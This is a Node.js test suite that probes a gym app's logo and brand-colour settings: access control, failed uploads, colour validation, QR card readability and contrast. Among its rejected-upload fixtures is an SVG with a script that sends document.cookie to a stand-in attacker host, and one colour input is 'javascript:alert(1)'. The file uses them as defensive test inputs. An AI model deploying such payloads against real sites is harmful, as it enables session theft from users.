// QA Release Tester — the gym's own sign (release/pilot at ba5fdf6).
//
// The gym now chooses its own colour and puts its own logo on every card. Two
// things can go wrong quietly here and both hurt the customer rather than the
// owner: a colour change that makes a card unscannable, and a rejected upload
// that takes the working logo away with it. These probe the edges the team's
// own suite leaves open.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { randomBytes, randomUUID } from 'node:crypto';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import request from 'supertest';
import { openDatabase, migrate } from '../server/db.js';
import { createApp } from '../server/app.js';
import { seedConfiguration } from '../server/seed.js';
import { SlipStore } from '../server/slips.js';
import { hashPassword } from '../server/passwords.js';
import { MAX_LOGO_BYTES } from '../server/theme.js';

const THAI = /[฀-๿]/;
const PASSWORD = 'counter-password-2569';

function gym(t) {
  const db = openDatabase(); migrate(db); seedConfiguration(db, Date.now());
  const root = mkdtempSync(join(tmpdir(), 'qa-brand-'));
  let time = Date.parse('2026-09-15T09:00:00+07:00');
  const app = createApp({ db, secret: randomBytes(32).toString('hex'), now: () => time,
    slipStore: new SlipStore(join(root, 'slips')),
    photoStore: new SlipStore(join(root, 'photos'), { maxBytes: 8e6 }),
    // The same limit production wires in; without it the store would allow a
    // slip-sized logo and the probes would measure the wrong door.
    logoStore: new SlipStore(join(root, 'logo'), { maxBytes: MAX_LOGO_BYTES }),
    promptPayId: '0812345678' });
  t.after(() => {
    app.locals.stopSweeper?.(); db.close();
    for (let i = 0; i < 15; i++) {
      try { return rmSync(root, { recursive: true, force: true }); } catch { /* still held */ }
    }
  });
  const call = (method, path, token, body) => {
    const req = request(app)[method](`/api${path}`).set('X-Gym-Client', 'mobile');
    if (token) req.set('Authorization', `Bearer ${token}`);
    return body === undefined ? req : req.send(body);
  };
  const send = (path, token, bytes, filename, contentType, field = 'logo') =>
    request(app).put(`/api${path}`).set('X-Gym-Client', 'mobile')
      .set('Authorization', `Bearer ${token}`)
      .attach(field, bytes, { filename, contentType });
  const user = (email, role, { status = 'active' } = {}) => {
    const id = randomUUID();
    db.prepare(`INSERT INTO users(id,email,role,status,password_hash,password_set_at,created_at)
      VALUES(?,?,?,?,?,?,?)`).run(id, email, role, status, hashPassword(PASSWORD), time, time);
    return id;
  };
  const signIn = async (email, role, options) => {
    user(email, role, options);
    const res = await request(app).post('/api/auth/login').set('X-Gym-Client', 'mobile')
      .send({ email, password: PASSWORD });
    return res.body.token;
  };
  const member = async (token, name = 'สุดา ใจดี') => {
    const res = await call('post', '/members', token,
      { name, phone: `0899${String(Math.floor(Math.random() * 1e6)).padStart(6, '0')}`,
        date_of_birth: null, emergency_contact: '' });
    return res.body;
  };
  return { db, app, call, send, signIn, member, tick: ms => { time += ms; } };
}

// --------------------------------------------------------------- the pictures

/** A logo the drawing code can open: flat colour, transparent corners. */
async function logo(tint = '#C81E1E', side = 240) {
  const { createCanvas } = await import('@napi-rs/canvas');
  const canvas = createCanvas(side, side);
  const ctx = canvas.getContext('2d');
  ctx.fillStyle = tint;
  ctx.beginPath(); ctx.arc(side / 2, side / 2, side * 0.42, 0, Math.PI * 2); ctx.fill();
  ctx.fillStyle = '#F2B705';
  ctx.fillRect(side * 0.2, side * 0.44, side * 0.6, side * 0.12);
  return canvas.toBuffer('image/png');
}

/** A PNG too big to accept: noise does not compress, so the bytes are real. */
async function oversizedPng() {
  const { createCanvas } = await import('@napi-rs/canvas');
  const side = 1400;
  const canvas = createCanvas(side, side);
  const ctx = canvas.getContext('2d');
  const image = ctx.createImageData(side, side);
  const noise = randomBytes(side * side * 4);
  image.data.set(noise);
  for (let at = 3; at < image.data.length; at += 4) image.data[at] = 255;
  ctx.putImageData(image, 0, 0);
  return canvas.toBuffer('image/png');
}

const truncatedPng = () => Buffer.concat([
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
  Buffer.from([0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52]),
  Buffer.from([0, 0, 1, 0, 0, 0, 1, 0, 8, 6, 0, 0, 0]),
]);
const SVG = Buffer.from(
  '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">'
  + '<script>fetch("https://evil.example/"+document.cookie)</script></svg>');
const GIF = Buffer.concat([Buffer.from('GIF89a', 'latin1'), Buffer.alloc(20, 7)]);

async function readCard(app, token, id) {
  const res = await request(app).get(`/api/members/${id}/card.png`)
    .set('X-Gym-Client', 'mobile').set('Authorization', `Bearer ${token}`)
    .buffer(true).parse((res2, cb) => {
      const chunks = [];
      res2.on('data', c => chunks.push(c));
      res2.on('end', () => cb(null, Buffer.concat(chunks)));
    });
  return { status: res.status, bytes: res.body };
}

/** Every pixel of the QR, as a scanner would see it. */
async function qrPixels(png) {
  const { createCanvas, loadImage } = await import('@napi-rs/canvas');
  const image = await loadImage(png);
  const canvas = createCanvas(image.width, image.height);
  canvas.getContext('2d').drawImage(image, 0, 0);
  const { default: jsQR } = await import('jsqr');
  const full = canvas.getContext('2d').getImageData(0, 0, image.width, image.height);
  const read = jsQR(new Uint8ClampedArray(full.data), image.width, image.height);
  // The QR block itself, from the card spec: 640px square at (220, 468).
  const patch = canvas.getContext('2d').getImageData(220, 468, 640, 640);
  const shades = new Map();
  for (let at = 0; at < patch.data.length; at += 4) {
    const key = `${patch.data[at]},${patch.data[at + 1]},${patch.data[at + 2]}`;
    shades.set(key, (shades.get(key) ?? 0) + 1);
  }
  return { size: [image.width, image.height], text: read?.data ?? null,
    shades: [...shades.entries()].sort((a, b) => b[1] - a[1]).slice(0, 4) };
}

/** The colour of one pixel of a PNG, as `#RRGGBB`. */
async function pixelAt(png, x, y) {
  const { createCanvas, loadImage } = await import('@napi-rs/canvas');
  const image = await loadImage(png);
  const canvas = createCanvas(image.width, image.height);
  canvas.getContext('2d').drawImage(image, 0, 0);
  const [r, g, b] = canvas.getContext('2d').getImageData(x, y, 1, 1).data;
  return `#${[r, g, b].map(v => v.toString(16).padStart(2, '0')).join('').toUpperCase()}`;
}

// ======================================================= A · who may do what
test('BRAND-01 only the owner changes the sign, and nobody outside can touch it', async t => {
  const { call, send, signIn } = gym(t);
  const owner = await signIn('owner@example.test', 'admin');
  const staff = await signIn('counter@example.test', 'staff');
  const stopped = await signIn('gone@example.test', 'admin');
  const picture = await logo();

  const writes = {
    'change the colour': token => call('put', '/gym/settings', token, { color_primary: '#C81E1E' }),
    'upload a logo': token => send('/gym/settings/logo', token, picture, 'logo.png', 'image/png'),
    'remove the logo': token => call('delete', '/gym/settings/logo', token, {}),
  };
  const report = {};
  for (const [what, run] of Object.entries(writes)) {
    // Suspending after signing in is how an account is really taken away: the
    // token is already in a browser somewhere.
    const suspended = await call('post', `/users/${
      (await call('get', '/users', owner)).body.items.find(u => u.email === 'gone@example.test').id
    }/suspend`, owner, { reason: 'QA ทดสอบ' });
    assert.equal(suspended.status, 200);
    report[what] = {
      'nobody signed in': (await run(null)).status,
      'a member of staff': (await run(staff)).status,
      'an owner who was suspended': (await run(stopped)).status,
    };
  }
  console.log('BRAND-01 writing to the gym sign:\n' + JSON.stringify(report, null, 1));
  for (const [what, row] of Object.entries(report)) {
    assert.equal(row['nobody signed in'], 401, `${what} is open to anybody`);
    assert.equal(row['a member of staff'], 403, `a member of staff can ${what}`);
    // Suspending drops the sessions, so the token is refused before the role
    // is ever consulted. Either answer means the door is shut.
    assert.ok([401, 403].includes(row['an owner who was suspended']),
      `a suspended owner can still ${what} (${row['an owner who was suspended']})`);
  }

  const reads = {
    'GET /gym/settings': token => call('get', '/gym/settings', token),
    'GET /public/theme': token => call('get', '/public/theme', token),
    'GET /gym/logo': token => call('get', '/gym/logo', token),
  };
  const seen = {};
  for (const [what, run] of Object.entries(reads)) {
    seen[what] = { 'nobody signed in': (await run(null)).status, 'a member of staff': (await run(staff)).status };
  }
  console.log('BRAND-01 reading it:\n' + JSON.stringify(seen, null, 1));
  assert.equal(seen['GET /gym/settings']['nobody signed in'], 401, 'the settings screen is open to anybody');
  assert.equal(seen['GET /gym/settings']['a member of staff'], 200, 'staff cannot see the page they were promised');
  assert.equal(seen['GET /public/theme']['nobody signed in'], 200, 'the login screen cannot paint itself');
});

test('BRAND-02 what the two public endpoints hand to a passer-by', async t => {
  const { call, send, signIn, member } = gym(t);
  const owner = await signIn('owner@example.test', 'admin');
  await member(owner, 'สุดา ใจดี');
  await send('/gym/settings/logo', owner, await logo(), 'logo.png', 'image/png').expect(200);
  await call('put', '/gym/settings', owner, { line_id: '@qagym', brand_short: 'คิว' }).expect(200);

  const theme = await call('get', '/public/theme', null).expect(200);
  console.log('BRAND-02 GET /api/public/theme with no session:\n'
    + JSON.stringify(theme.body, null, 1).slice(0, 1400));
  const keys = Object.keys(theme.body).sort();
  console.log('BRAND-02 keys:', JSON.stringify(keys));

  // Nothing that identifies a person, a file on disk or a way in.
  const flat = JSON.stringify(theme.body);
  for (const forbidden of ['example.test', 'stored_name', 'password', 'token', 'secret', '@example',
    'sqlite', '/data/', 'member']) {
    assert.ok(!flat.toLowerCase().includes(forbidden.toLowerCase()),
      `the public theme carries "${forbidden}"`);
  }
  assert.ok(!keys.includes('logo_avg'), 'the public theme carries a value only the card needs');

  // What it does carry beyond colours and a logo, so the decision is on record.
  const beyond = keys.filter(k => !['brand', 'brand_en', 'brand_short', 'has_logo', 'logo_url',
    'theme', 'version'].includes(k));
  console.log('BRAND-02 beyond the theme and the logo:', JSON.stringify(
    Object.fromEntries(beyond.map(k => [k, theme.body[k]]))));
  const alreadyPublic = await call('get', '/public/gym', null).expect(200);
  console.log('BRAND-02 what /api/public/gym already published:',
    JSON.stringify(alreadyPublic.body).slice(0, 400));

  const logoRes = await call('get', '/gym/logo', null).expect(200);
  console.log('BRAND-02 GET /api/gym/logo with no session ->', logoRes.status,
    JSON.stringify({ type: logoRes.headers['content-type'],
      nosniff: logoRes.headers['x-content-type-options'],
      csp: logoRes.headers['content-security-policy'],
      cache: logoRes.headers['cache-control'] ?? null,
      disposition: logoRes.headers['content-disposition'] ?? null }));
  assert.match(logoRes.headers['content-type'], /image\/png/);
  assert.equal(logoRes.headers['x-content-type-options'], 'nosniff');
});

// ================================================= B · an upload that fails
test('BRAND-03 a refused logo never takes the working one with it', async t => {
  const { call, send, signIn } = gym(t);
  const owner = await signIn('owner@example.test', 'admin');
  const good = await send('/gym/settings/logo', owner, await logo(), 'logo.png', 'image/png').expect(200);
  const before = { url: good.body.logo_url, version: good.body.version, has: good.body.has_logo };
  console.log('BRAND-03 the logo that works:', JSON.stringify(before));

  const attempts = {
    'a PNG that stops halfway': [truncatedPng(), 'half.png', 'image/png'],
    'a PDF wearing a .png name': [Buffer.from('%PDF-1.4 not a picture at all'), 'logo.png', 'image/png'],
    'an SVG with a script in it': [SVG, 'logo.svg', 'image/svg+xml'],
    'a GIF': [GIF, 'logo.gif', 'image/gif'],
    'an empty file': [Buffer.alloc(0), 'logo.png', 'image/png'],
    'a picture over the limit': [await oversizedPng(), 'huge.png', 'image/png'],
  };
  const report = {};
  for (const [name, [bytes, filename, type]] of Object.entries(attempts)) {
    const res = await send('/gym/settings/logo', owner, bytes, filename, type);
    const now = await call('get', '/gym/settings', owner).expect(200);
    report[name] = { bytes: bytes.length, status: res.status, error: res.body.error,
      still_there: now.body.has_logo, url_moved: now.body.logo_url !== before.url,
      version_moved: now.body.version !== before.version };
  }
  console.log('BRAND-03 uploads that must fail:\n' + JSON.stringify(report, null, 1));
  for (const [name, row] of Object.entries(report)) {
    assert.ok(row.status >= 400 && row.status < 500, `${name} was accepted (${row.status})`);
    assert.ok(THAI.test(row.error ?? ''), `${name} was refused in English: ${row.error}`);
    assert.equal(row.still_there, true, `${name} left the gym with no logo`);
    assert.equal(row.url_moved, false, `${name} changed the logo anyway`);
    assert.equal(row.version_moved, false, `${name} moved the version without changing anything`);
  }
  // The message a person reads has to be about the thing they uploaded.
  const tooBig = report['a picture over the limit'].error ?? '';
  console.log('BRAND-03 what the owner is told about a logo that is too big:', JSON.stringify(tooBig));
  assert.ok(!/สลิป/.test(tooBig), 'a logo that is too big is refused with a message about payment slips');
  assert.ok(/2\s*MB/.test(tooBig), `the limit quoted is not the logo's own (${tooBig})`);

  // And the card, which is what the customer holds, is unmoved by any of it.
  const card = await call('get', '/gym/settings', owner).expect(200);
  assert.equal(card.body.version, before.version);
});

test('BRAND-04 the colour field refuses what is not a colour, and keeps what was there', async t => {
  const { call, signIn } = gym(t);
  const owner = await signIn('owner@example.test', 'admin');
  await call('put', '/gym/settings', owner, { color_primary: '#C81E1E' }).expect(200);
  const before = (await call('get', '/gym/settings', owner)).body;

  const attempts = {
    'a word': 'red',
    'a css function': 'rgb(200,30,30)',
    'four digits': '#ABCD',
    'javascript': 'javascript:alert(1)',
    'an expression': 'var(--ok)',
    'empty': '',
    'a short colour': '#f00',
  };
  const report = {};
  for (const [name, value] of Object.entries(attempts)) {
    const res = await call('put', '/gym/settings', owner, { color_primary: value });
    report[name] = { status: res.status, error: res.body.error ?? res.body.fields?.color_primary,
      now: (await call('get', '/gym/settings', owner)).body.theme.brand };
  }
  console.log('BRAND-04 what the colour field accepts:\n' + JSON.stringify(report, null, 1));
  assert.equal(report['a short colour'].status, 200, '#f00 is a colour and should be taken');
  assert.equal(report['a short colour'].now, '#FF0000');
  for (const name of ['a word', 'a css function', 'four digits', 'javascript', 'an expression', 'empty']) {
    assert.ok(report[name].status >= 400, `${name} was accepted as a colour`);
    assert.ok(THAI.test(JSON.stringify(report[name].error)), `${name} was refused in English`);
  }
  assert.ok(before.theme.brand);
});

// =========================================== C · the card already in a pocket
test('BRAND-05 changing the colour never changes the card a member is carrying', async t => {
  const { app, call, send, signIn, member } = gym(t);
  const owner = await signIn('owner@example.test', 'admin');
  const staff = await signIn('counter@example.test', 'staff');
  const suda = await member(staff, 'สุดา ใจดี');
  await send('/gym/settings/logo', owner, await logo(), 'logo.png', 'image/png').expect(200);
  // A card with nothing behind it is refused at the door for a reason that has
  // nothing to do with colour, so the member is sold something first.
  const pack = await call('post', '/packages', owner, { code: 'QA_BRAND', name_th: 'QA ทดสอบแบรนด์',
    type: 'unlimited', duration_days: 90, price_thb: 1, status: 'active', description: '' }).expect(201);
  await call('post', `/members/${suda.id}/grant`, staff,
    { package_id: pack.body.id, payment_method: 'cash', note: 'QA' }).expect(201);

  const first = await call('get', `/members/${suda.id}/card`, staff).expect(200);
  const original = { qr: first.body.qr, version: first.body.card_version };
  console.log('BRAND-05 the card the member was sent:', JSON.stringify(original));

  // Five colours a real gym might pick, including the two that break naive
  // contrast rules and the two extremes.
  const report = {};
  for (const colour of ['#C81E1E', '#F2C200', '#FFFFFF', '#000000', '#808080']) {
    await call('put', '/gym/settings', owner, { color_primary: colour }).expect(200);
    const detail = await call('get', `/members/${suda.id}/card`, staff).expect(200);
    const png = await readCard(app, staff, suda.id);
    const scanned = await qrPixels(png.bytes);
    const entry = await call('post', '/check-ins/verify', staff,
      { qr: original.qr, device_label: 'QA เคาน์เตอร์' });
    report[colour] = {
      qr_unchanged: detail.body.qr === original.qr,
      card_version: detail.body.card_version,
      size: scanned.size,
      a_scanner_reads_the_old_card: scanned.text === original.qr,
      qr_shades: scanned.shades.map(([rgb, n]) => `${rgb}×${n}`),
      the_old_card_at_the_door: entry.body.result ?? entry.status,
    };
  }
  console.log('BRAND-05 after each colour change:\n' + JSON.stringify(report, null, 1));
  for (const [colour, row] of Object.entries(report)) {
    assert.equal(row.qr_unchanged, true, `${colour} changed the token on the card`);
    assert.equal(row.card_version, original.version, `${colour} moved the card version`);
    assert.deepEqual(row.size, [1080, 1350], `${colour} changed the size of the card`);
    assert.equal(row.a_scanner_reads_the_old_card, true, `${colour} made the card unreadable`);
    assert.notEqual(row.the_old_card_at_the_door, 'denied', `${colour} shut the door on an issued card`);
  }

  // The ink of the QR must be the same in every gym. It is not pure #000000 --
  // the card uses its own near-black #0A0F0C -- and that is fine as long as it
  // never follows the brand and never gets close to the paper it sits on, which
  // is what a phone screen at low brightness cannot survive.
  const inks = Object.values(report).map(row => JSON.stringify(row.qr_shades));
  console.log('BRAND-05 the ink of the QR in five different gyms:', JSON.stringify([...new Set(inks)]));
  assert.equal(new Set(inks).size, 1, 'the QR is painted differently depending on the gym colour');
  const measured = new Map(Object.values(report)[0].qr_shades.map(e => e.split('×')));
  const shades = [...measured.keys()].map(rgb => rgb.split(',').map(Number));
  const lum = ([r, g, b]) => {
    const f = v => { v /= 255; return v <= 0.03928 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4; };
    return 0.2126 * f(r) + 0.7152 * f(g) + 0.0722 * f(b);
  };
  const darkest = shades.reduce((a, b) => (lum(a) < lum(b) ? a : b));
  const lightest = shades.reduce((a, b) => (lum(a) > lum(b) ? a : b));
  const ratio = (lum(lightest) + 0.05) / (lum(darkest) + 0.05);
  console.log(`BRAND-05 darkest ${darkest} on lightest ${lightest} = ${ratio.toFixed(1)}:1`);
  assert.deepEqual(lightest, [255, 255, 255], 'the QR does not sit on white paper');
  assert.ok(ratio > 15, `the QR is only ${ratio.toFixed(1)}:1 against its background`);
  for (const colour of ['#C81E1E', '#F2C200', '#808080']) {
    const [r, g, b] = [1, 3, 5].map(at => parseInt(colour.slice(at, at + 2), 16));
    assert.ok(!shades.some(s => Math.abs(s[0] - r) + Math.abs(s[1] - g) + Math.abs(s[2] - b) < 40),
      `${colour} bled into the QR`);
  }
});

test('BRAND-06 what the settings screen previews is what the card is painted with', async t => {
  const { app, call, send, signIn, member } = gym(t);
  const owner = await signIn('owner@example.test', 'admin');
  const staff = await signIn('counter@example.test', 'staff');
  const suda = await member(staff, 'สุดา ใจดี');
  await send('/gym/settings/logo', owner, await logo(), 'logo.png', 'image/png').expect(200);

  const report = {};
  for (const colour of ['#C81E1E', '#F2C200', '#1B4FD8']) {
    const saved = await call('put', '/gym/settings', owner, { color_primary: colour }).expect(200);
    const preview = saved.body.theme;
    const png = await readCard(app, staff, suda.id);
    // The top band of the card, well inside it and clear of the logo plate.
    const painted = await pixelAt(png.bytes, 40, 40);
    report[colour] = { the_screen_shows: preview.brand_surface, the_card_is_painted: painted,
      same: painted === preview.brand_surface, raw_kept: preview.brand === colour,
      ink: preview.on_brand, warning: preview.warning ? preview.warning.slice(0, 40) + '…' : null };
  }
  console.log('BRAND-06 preview against the picture:\n' + JSON.stringify(report, null, 1));
  for (const [colour, row] of Object.entries(report)) {
    assert.equal(row.raw_kept, true, `${colour} was not handed back to the screen as chosen`);
    assert.equal(row.same, true,
      `${colour}: the screen previews ${row.the_screen_shows} and the card is ${row.the_card_is_painted}`);
  }
});

// ================================================== E · two tablets at once
test('BRAND-07 two tablets cannot quietly undo each other, whatever they send', async t => {
  const { call, signIn } = gym(t);
  const owner = await signIn('owner@example.test', 'admin');
  const other = await signIn('owner2@example.test', 'admin');
  const opened = (await call('get', '/gym/settings', owner).expect(200)).body.version;

  const first = await call('put', '/gym/settings', owner,
    { color_primary: '#C81E1E', version: opened }).expect(200);
  const second = await call('put', '/gym/settings', other,
    { color_primary: '#1B4FD8', version: opened });
  console.log('BRAND-07 the second tablet, holding the version it opened with ->',
    second.status, JSON.stringify(second.body.error));
  assert.equal(second.status, 409, 'the second tablet quietly overwrote the first');
  assert.ok(THAI.test(second.body.error ?? ''));
  assert.equal((await call('get', '/gym/settings', owner)).body.theme.brand, '#C81E1E',
    'the colour the first tablet saved was lost');

  // The guard is only armed when the caller sends a version. If a screen ever
  // stops sending one -- or anything that is not the screen calls the API --
  // the last write wins with nothing said.
  const withoutVersion = await call('put', '/gym/settings', other, { color_primary: '#1B4FD8' });
  const after = await call('get', '/gym/settings', owner);
  console.log('BRAND-07 the same tablet, sending no version at all ->', withoutVersion.status,
    '| the colour is now', JSON.stringify(after.body.theme.brand),
    '| version', first.body.version, '->', after.body.version);
  assert.equal(withoutVersion.status, 409,
    'a save that carries no version is allowed through and overwrites whatever was there');
});

// ========================================== G · everything else still stands
test('BRAND-08 a hostile brand colour does not reach the things that mean pass and fail', async t => {
  const { call, signIn } = gym(t);
  const owner = await signIn('owner@example.test', 'admin');
  const report = {};
  for (const colour of ['#C81E1E', '#F2C200', '#FFFFFF', '#000000', '#808080']) {
    const saved = await call('put', '/gym/settings', owner, { color_primary: colour }).expect(200);
    const theme = saved.body.theme;
    report[colour] = { surface: theme.brand_surface, ink: theme.on_brand, ratios: theme.ratios,
      notes: (theme.notes ?? []).map(n => n.title), warning: !!theme.warning };
    // Nothing in the payload may be named as the colour of a status chip: that
    // is what keeps "เข้าใช้บริการได้" green in a red gym.
    for (const key of Object.keys(theme)) {
      //  is a sentence for the owner, not a colour; anything that
      // looks like a status swatch would be.
      assert.ok(!/^(ok|deny|err)_?(color|colour)?$|^(ok|deny|err)$/.test(key),
        `the theme carries a status colour: ${key}`);
    }
  }
  console.log('BRAND-08 five colours a gym might really choose:\n' + JSON.stringify(report, null, 1));
  // Text needs 4.5:1 (WCAG 1.4.3); the box border around an input is not text
  // and needs 3:1 (1.4.11). The settings screen shows the same two bars, so a
  // border at 3.1 is not a failure and must not be reported to the owner as one.
  const bar = { onSurface: 4.5, inkOnWhite: 4.5, inkOnSoft: 4.5, lineOnCanvas: 3, onSecondary: 4.5 };
  for (const [colour, row] of Object.entries(report)) {
    assert.ok(['#FFFFFF', '#000000', '#0E1418'].includes(row.ink),
      `${colour} produced an ink that is neither the paper nor the app's own: ${row.ink}`);
    for (const [name, ratio] of Object.entries(row.ratios ?? {})) {
      assert.ok(ratio >= bar[name], `${colour}: ${name} is only ${ratio}:1, below its ${bar[name]}:1`);
    }
  }
  // The two extremes are the ones a gym picks by accident off a logo; both are
  // taken, because it is their sign, and both must say so.
  assert.ok(report['#FFFFFF'].warning, 'a white brand was accepted with nothing said');
  assert.ok(report['#000000'].warning, 'a black brand was accepted with nothing said');
});

test('BRAND-09 a gym that has set nothing still works, and the way back is always offered', async t => {
  const { app, call, signIn, member } = gym(t);
  const owner = await signIn('owner@example.test', 'admin');
  const staff = await signIn('counter@example.test', 'staff');
  const suda = await member(staff, 'สุดา ใจดี');

  const fresh = await call('get', '/public/theme', null).expect(200);
  console.log('BRAND-09 a gym that has changed nothing:', JSON.stringify({
    brand: fresh.body.theme.brand, has_logo: fresh.body.has_logo,
    logo_url: fresh.body.logo_url, short: fresh.body.brand_short }));
  assert.equal(fresh.body.has_logo, false);
  assert.equal(fresh.body.logo_url, null);
  assert.ok(fresh.body.brand_short, 'with no logo and no short name there is nothing to draw in the square');
  const card = await readCard(app, staff, suda.id);
  const scanned = await qrPixels(card.bytes);
  console.log('BRAND-09 the card of a gym with no logo ->', card.status, JSON.stringify(scanned.size),
    '| readable:', !!scanned.text);
  assert.equal(card.status, 200);
  assert.ok(scanned.text, 'a gym that never opened the settings page cannot hand out a card');

  const missing = await call('get', '/gym/logo', null);
  console.log('BRAND-09 asking for a logo that was never uploaded ->', missing.status,
    JSON.stringify(missing.body.error));
  assert.equal(missing.status, 404);
  assert.ok(THAI.test(missing.body.error ?? ''));

  // Having picked a colour, the owner must be able to get back to the one the
  // app shipped with without knowing its hex by heart.
  await call('put', '/gym/settings', owner, { color_primary: '#C81E1E' }).expect(200);
  const offered = (await call('get', '/gym/settings', owner).expect(200)).body.palette;
  console.log('BRAND-09 the colours offered after choosing red:', JSON.stringify(offered));
  assert.ok(offered.includes('#05603A'), 'there is no way back to the colour the app shipped with');
});
